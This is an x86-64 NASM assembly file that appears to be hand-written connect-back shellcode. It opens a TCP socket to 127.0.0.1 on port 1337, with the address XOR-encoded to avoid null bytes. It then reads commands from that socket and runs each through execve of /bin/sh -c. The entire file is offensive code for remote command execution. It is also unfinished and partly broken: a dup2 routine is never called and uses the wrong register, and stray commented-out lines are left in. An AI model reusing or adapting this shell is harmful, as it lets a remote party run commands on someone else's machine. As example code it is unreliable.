BITS 64

section .text
global _start

_start:

; make room on the stack (8 bytes) buffer
sub rsp, 0x9
mov r15, rsp
;mov r11, 0x00

; set registery to 0
xor rax, rax
xor rbx, rbx
xor rsi, rsi
xor rdi, rdi

;              SYS_SOCKET

mov rax, 41                 ; sys_socket
mov rdi, 2                  ; domain = 2 (AF_INET)
mov rsi, 1                  ; Type = 1 (SOCK_STREAM)
xor rdx, rdx                ; Protocol = 0 (TCP)
syscall

; Save return value of syscall
mov rdx, rax

;               SYS_CONNECT
mov rbx, 0xfeffff80         ; xor of 0x0100007f and 0xffffffff
xor rbx, 0xffffffff         ; mov 0x0100007f in rbx
push rbx                    ; s_addr = 127.0.0.1
push word 0x3905            ; int port = 1337
push word 0x2               ; int family = AF_INET

mov rax, 42
mov rdi, rdx                ; fd = return fd of sys_socket
mov rsi, rsp                ; *uservaddr = rsp (addr of start of struct)
mov rdx, 24                 ; addrlen = 24
syscall

mov r9, rdi                ; save fd of socket


call _read

call _echo


;               SYS_DUP2
_read_write:
    ; STDIN
    mov rax, 33
    mov rdi, rcx                ; newfd = socket fd
    xor rsi, rsi                ; oldfd = 0 (STDIN)
    syscall
    ; STDOUT
    ;mov rax, 33
    ;mov rsi, 1                  ; oldfd = 0 (STDIN)
    ;syscall
    ; STDERR
    mov rax, 33
    mov rsi, 2                  ; oldfd = 0 (STDIN)
    syscall

    ret

_read:
    
    mov r13, rsp
    xor rbx, rbx
    xor r12, r12

    push rbx  ; push \0

    .readloop:
    
        ;; Call sys_read
        mov     rax, 0          ; SYS_READ
        mov     rdi, r9         ; client socket fd
        mov     rsi, r15        ; buffer
        mov     rdx, 8        ; read 8 bytes 
        syscall
        ; save rax
        ;mov rcx, rax

        xor rcx, rcx  ; cx-register is the counter, set to 0
        xor rdx, rdx  
        xor r14, r14
        mov r14, rsp
        push qword rdx

        cmp rbx, 0
        jne .donotsavestartcommand
            mov r12, r14 ; save start of command string
        .donotsavestartcommand:


        ; add to total read bytes
        add rbx, rax

        .loopstring:

            ;mov r11b, [r15]
            ;add r15, rdx
            
            cmp byte [r15 + rcx], 0x0a ; is character equal to \n
            jne .isnormalchar
                mov byte [r14], 0x22 ; add "
                dec rax
                jmp .skiploopstring
            .isnormalchar:
            mov dl, byte [r15 + rcx]
            mov byte [r14], dl
            ;rol rdx, 8
            ;mov dl, byte [r15 + rcx]
            ;nop         ; Whatever you wanna do goes here, should not change cx
            inc rcx      ; Increment
            inc r14
            cmp rcx, rax    ; Compare cx to the limit
            jne .loopstring   ; Loop while less or equal
            .skiploopstring:
        
; ls -laX
        mov qword [r15], rdx
        cmp rax, 8                      ; if has reach end of message
        je .readloop

    
    
    ; EXECVE /BIN/SH
    ;mov rdx, rsp
    push rdx
    mov rbx, 0x632d       ; -c
    push rbx
    mov rcx, rsp
    mov rbx, 0x0068732F6E69622F ; "/bin/sh"
    push rbx 
    ; save "//bin/sh" addr
    mov rbx, rsp

    push rax                    ; push 0x00

    push r12

    ;push  rdx                   ; push *char[] of "/bin/ls"

    push rcx                    ; push *char[] of -c

    push rbx                    ; push *char[] of "//bin/sh"

    ; execve of "//bin/sh"
    mov rax, 59                 ; execve syscall (x86_64)
    mov rdi, rbx                ; char* = "//bin/sh"
    mov rsi, rsp                ; *argv[] = "//bin/sh"
    xor rdx, rdx                ; *envp[] = 0
    ;mov r11, 0xff
    syscall

    ;call _echo

    ;; Copy number of bytes read to variable
    mov     rax, rbx

    ;jmp .readloop

    mov rsp, r13
    ret

_echo:
    mov     rax, 1               ; SYS_WRITE
    mov     rdi, r9        ; client socket fd
    mov     rsi, r15        ; buffer
    mov     rdx, rbx    ; number of bytes received in _read
    syscall

    ret

; abcdefghijklmnop
; al- sl